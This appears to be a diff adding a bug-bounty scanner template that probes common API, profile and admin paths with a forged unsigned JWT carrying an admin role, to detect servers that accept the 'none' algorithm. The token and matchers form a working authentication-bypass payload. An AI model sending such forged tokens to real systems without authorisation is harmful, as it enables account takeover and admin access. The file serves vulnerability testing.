@@ -1,0 +1,51 @@
+id: jwt-none-algorithm
+
+info:
+  name: JWT None Algorithm Attack
+  author: bb-toolkit
+  severity: critical
+  description: Tests if the server accepts JWT tokens signed with 'none' algorithm, bypassing signature verification
+  tags: jwt,auth,bypass,critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/me"
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/v1/me"
+      - "{{BaseURL}}/api/v1/user"
+      - "{{BaseURL}}/me"
+      - "{{BaseURL}}/profile"
+      - "{{BaseURL}}/dashboard"
+      - "{{BaseURL}}/admin"
+
+    headers:
+      # JWT with none alg: {"alg":"none","typ":"JWT"}.{"sub":"1","role":"admin"}
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ."
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "user"
+          - "email"
+          - "admin"
+          - "profile"
+          - "username"
+        condition: or
+
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "Invalid token"
+          - "Unauthorized"
+          - "invalid signature"
+          - "jwt malformed"
+          - "JsonWebTokenError"
